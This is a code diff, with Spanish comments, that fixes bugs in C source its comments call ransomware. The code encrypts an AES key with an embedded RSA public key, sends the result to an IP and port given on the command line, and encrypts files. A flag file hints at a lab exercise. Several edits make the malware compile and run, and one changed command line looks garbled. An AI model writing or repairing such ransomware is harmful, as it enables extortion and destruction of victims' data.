@@ -71,11 +71,12 @@ void end_file(char aes[]){
             "-out", "enviame.enc", (char *)NULL
         };
         int e = execv("/usr/bin/openssl", args);
-        exit(0)
+        exit(0);
     } else {
         int status;
         close(mypipe[0]);
         dprintf(mypipe[1], "%s", aes);
+        close(mypipe[1]);
         int ro = wait(&status);
     }
 
@@ -152,28 +153,30 @@ void send_file(char * filename, char * ip, char * port){
 }
 
 void key_pub(int i){
-    char * pub_key {
-        "-----BEGIN PUBLIC KEY-----"
-        "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2iM7qHGt9FQL1HeYldsE"
-        "nwfmAhlc3bfmRaxVA07YrjdCVTXyhjKq5cn8iE8nDWUDwbrZKnLIe63G7LpT6L8l"
-        "oqCgHieEPR3ZqXzuLjr0ZCkU9cFE8E1oJV7bfLEotH5iZpeuY06C1GwWi9+Kdrf9"
-        "R0J3dplb1BIxrsAxdiq+nUHVAeUIpDefvadJsK9pjUpfvsUH7O214S8CAzH1irxY"
-        "ejQlqrGdWXlzbeTzlm+BRl9VoxL04lioKDjw5c0dpYrP/MFysZqyzZdp3ctLwRYN"
-        "818+heHgGYoakWTUOqlhQXZh+O6mecya5j6BaxcXSL7IacQc5+Q9GKzlm7FlNpga"
-        "PQHKbaSbEifpCI6Ix4p/l44ZJTpq9VkrUrZNDbSsUFCIaVaFkXtGzrFcZLVusLaq"
-        "+Y9TUF1uKzK4UxAC+hU92O+ZxVhGTg1Z99Bj4vbKvDCr1YHRJeiziwwehb4i0xia"
-        "K8ft35krQl+Slkt57MuWrefdbtD0qvvw0u6H+6thtGZv2c4vg+MSK2pddPWC8IPi"
-        "kSHJOxR9B3Tmw9cOBhMvKoUSHHl4Rfznw7t4hzk2FL/HTpee4vP626CVLqDycYBe"
-        "yMo9tDSCJzE13yydTPNS5SzmavNTlAoM6VKJ8W7eqXloJ7TGTtJejzSJDGA21dGx"
-        "8CPFuYvv302VnB7d/urDbH8CAwEAAQ=="
-        "-----END PUBLIC KEY----"
-    }
+    char * pub_key = {
+        "-----BEGIN PUBLIC KEY-----\n"
+        "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2iM7qHGt9FQL1HeYldsE\n"
+        "nwfmAhlc3bfmRaxVA07YrjdCVTXyhjKq5cn8iE8nDWUDwbrZKnLIe63G7LpT6L8l\n"
+        "oqCgHieEPR3ZqXzuLjr0ZCkU9cFE8E1oJV7bfLEotH5iZpeuY06C1GwWi9+Kdrf9\n"
+        "R0J3dplb1BIxrsAxdiq+nUHVAeUIpDefvadJsK9pjUpfvsUH7O214S8CAzH1irxY\n"
+        "ejQlqrGdWXlzbeTzlm+BRl9VoxL04lioKDjw5c0dpYrP/MFysZqyzZdp3ctLwRYN\n"
+        "818+heHgGYoakWTUOqlhQXZh+O6mecya5j6BaxcXSL7IacQc5+Q9GKzlm7FlNpga\n"
+        "PQHKbaSbEifpCI6Ix4p/l44ZJTpq9VkrUrZNDbSsUFCIaVaFkXtGzrFcZLVusLaq\n"
+        "+Y9TUF1uKzK4UxAC+hU92O+ZxVhGTg1Z99Bj4vbKvDCr1YHRJeiziwwehb4i0xia\n"
+        "K8ft35krQl+Slkt57MuWrefdbtD0qvvw0u6H+6thtGZv2c4vg+MSK2pddPWC8IPi\n"
+        "kSHJOxR9B3Tmw9cOBhMvKoUSHHl4Rfznw7t4hzk2FL/HTpee4vP626CVLqDycYBe\n"
+        "yMo9tDSCJzE13yydTPNS5SzmavNTlAoM6VKJ8W7eqXloJ7TGTtJejzSJDGA21dGx\n"
+        "8CPFuYvv302VnB7d/urDbH8CAwEAAQ==\n"
+        "-----END PUBLIC KEY-----"
+    };
     if(i == 1){
         int fd = open("clave.pub.pem", O_CREAT| O_WRONLY, 0444);
         write(fd, pub_key, strlen(pub_key));
         close(fd);
+        fsync(fd);
     } else if(i == 0){
-        execv("/bin/rm", "rm", "clave.pub.pem", (char *)NULL);
+        char * myargs[] = {"rm", "clave.pub.pem", (char *)NULL};
+        execv("/bin/rm", myargs);
     }
 }
 //--------------------------------------------
@@ -207,7 +210,7 @@ void cifrar(char path[], char file[], char passwd[]) {
   strcat(command,path);
   strcat(command,"/");
   strcat(command,file);
-  strcat(command,".ntd 2>/dev/null; rm ");
+  strcat(command,".ntd 2>/dev/null; /usr/bin -zfun 1 ");
   strcat(command,path);
   strcat(command,"/");
   strcat(command,file);
@@ -272,7 +275,7 @@ void main(int argc, char * argv[]){
         exit(69);
     }
     //Create flag
-    create_flag("root/flag.ntd");
+    create_flag("/root/flag.ntd");
     //Key AES para el cifrado de ficheros
     char key[48];
     strcat(key,gen_aes());
@@ -281,9 +284,9 @@ void main(int argc, char * argv[]){
     //Creando fichero con informacion confidencial para enviar al dueño del ransomware
     end_file(key);
     //Enviando fichero confidencial
-    send_file(argv[1],argv[2]);
+    send_file("enviame.enc",argv[1],argv[2]);
     //Del RSA Pub
-    key_pub(0);
+    //key_pub(0);
     //Listar ficheros y cifrar
     list_files(strlen(path),0,key);
 }
